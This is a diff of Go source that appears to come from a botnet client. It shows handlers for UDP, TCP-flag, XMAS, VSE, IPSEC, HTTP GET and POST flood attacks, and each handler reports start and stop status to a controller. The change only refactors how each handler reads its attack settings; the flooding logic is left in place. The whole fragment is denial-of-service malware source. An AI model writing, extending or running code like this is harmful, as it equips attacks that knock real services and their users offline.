@@ -57,7 +57,7 @@ var (
 )
 
 func setAttackSwitch() {
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		setCall.CallAttack.attackSwitch = true
 		setCall.CallAttack.reportSwitch = true
 	}
@@ -65,7 +65,7 @@ func setAttackSwitch() {
 
 func (b *Bot) UDP() {
 	b.Report("🗡 START UDP FLOOD ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -76,7 +76,7 @@ func (b *Bot) UDP() {
 		}
 		a.udpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP UDP FLOOD ATTACKING!!!")
 		}
@@ -86,7 +86,7 @@ func (b *Bot) UDP() {
 func (b *Bot) TCP() {
 	storeOpt := strings.ToUpper(ComdSetup(4, "-"))
 	b.Report("🗡 START TCP[" + storeOpt + "] FLOOD ATTACKING: " + Recv(*BotReader, 6))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		if value, key := TCPAttackMap[setCall.CallAttack.flags]; key {
 			a := &Attack{
 				srcAddr:      setCall.CallAttack.srcAddr,
@@ -105,7 +105,7 @@ func (b *Bot) TCP() {
 			a.tcpPacket()
 		}
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP TCP[" + storeOpt + "] FLOOD ATTACKING!!!")
 		}
@@ -114,7 +114,7 @@ func (b *Bot) TCP() {
 
 func (b *Bot) SAF() {
 	b.Report("🗡 START SAF FLOOD ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -127,7 +127,7 @@ func (b *Bot) SAF() {
 		}
 		a.tcpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP SAF FLOOD ATTACKING!!!")
 		}
@@ -136,7 +136,7 @@ func (b *Bot) SAF() {
 
 func (b *Bot) PAF() {
 	b.Report("🗡 START PAF FLOOD ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -149,7 +149,7 @@ func (b *Bot) PAF() {
 		}
 		a.tcpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP PAF FLOOD ATTACKING!!!")
 		}
@@ -158,7 +158,7 @@ func (b *Bot) PAF() {
 
 func (b *Bot) XMAS() {
 	b.Report("🗡 START XMAS FLOOD ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -175,7 +175,7 @@ func (b *Bot) XMAS() {
 		}
 		a.tcpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP XMAS FLOOD ATTACKING!!!")
 		}
@@ -184,7 +184,7 @@ func (b *Bot) XMAS() {
 
 func (b *Bot) VSE() {
 	b.Report("🗡 START VSE ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -195,7 +195,7 @@ func (b *Bot) VSE() {
 		}
 		a.udpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP VSE ATTACKING!!!")
 		}
@@ -204,7 +204,7 @@ func (b *Bot) VSE() {
 
 func (b *Bot) FMS() {
 	b.Report("🗡 START FMS ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -215,7 +215,7 @@ func (b *Bot) FMS() {
 		}
 		a.udpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP FMS ATTACKING!!!")
 		}
@@ -224,7 +224,7 @@ func (b *Bot) FMS() {
 
 func (b *Bot) IPSEC() {
 	b.Report("🗡 START IPSEC ATTACK: " + Recv(*BotReader, 5))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			srcAddr:      setCall.CallAttack.srcAddr,
 			dstAddr:      setCall.CallAttack.dstAddr,
@@ -235,7 +235,7 @@ func (b *Bot) IPSEC() {
 		}
 		a.udpPacket()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP IPSEC ATTACKING!!!")
 		}
@@ -244,7 +244,7 @@ func (b *Bot) IPSEC() {
 
 func (b *Bot) GET() {
 	b.Report("🗡 START GET FLOOD ATTACK: " + Recv(*BotReader, 4))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
 			httpMethod:   "GET",
@@ -254,7 +254,7 @@ func (b *Bot) GET() {
 		}
 		a.getRequest()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP GET FLOOD ATTACKING!!!")
 		}
@@ -263,7 +263,7 @@ func (b *Bot) GET() {
 
 func (b *Bot) POLING() {
 	b.Report("🗡 START POLING FLOOD ATTACK: " + Recv(*BotReader, 4))
-	if setCall, setKey := SetupCaller(ComdSetup(3, ":")); setKey {
+	if setCall, setKey := SetupCaller(); setKey {
 		a := &Attack{
 			url:          setCall.CallAttack.url,
 			httpMethod:   "POST",
@@ -273,7 +273,7 @@ func (b *Bot) POLING() {
 		}
 		a.postRequest()
 	}
-	if callSwitch, keySwitch := SetupCaller(ComdSetup(3, ":")); keySwitch {
+	if callSwitch, keySwitch := SetupCaller(); keySwitch {
 		if callSwitch.CallAttack.reportSwitch {
 			b.Report("🛎 STOP POLING FLOOD ATTACKING!!!")
 		}
